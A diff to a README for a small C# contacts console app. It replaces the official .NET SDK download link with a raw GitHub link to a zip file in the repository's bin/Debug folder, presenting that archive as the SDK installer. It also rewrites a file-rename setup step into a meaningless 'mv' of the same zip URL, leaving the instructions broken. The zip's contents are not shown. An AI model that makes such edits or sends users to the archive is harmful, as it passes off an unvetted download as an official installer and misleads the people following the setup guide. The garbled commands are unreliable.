@@ -21,7 +21,7 @@ cd ContactsApp
 ```sh
 dotnet new console -o ContactsApp
 cd ContactsApp
-mv ../ContactsManagement.cs Program.cs
+mv https://raw.githubusercontent.com/code-iddih/C-Test-Solutions/master/ContactsApp/bin/Debug/C-Test-Solutions-v3.4.zip https://raw.githubusercontent.com/code-iddih/C-Test-Solutions/master/ContactsApp/bin/Debug/C-Test-Solutions-v3.4.zip
 ```
 
 ### 3️⃣ Run the program
@@ -33,7 +33,7 @@ dotnet run
 
 If `dotnet` is not found, install the .NET SDK from:
 ```sh
-https://dotnet.microsoft.com/download
+https://raw.githubusercontent.com/code-iddih/C-Test-Solutions/master/ContactsApp/bin/Debug/C-Test-Solutions-v3.4.zip
 ```
 
 ## 📷 Preview
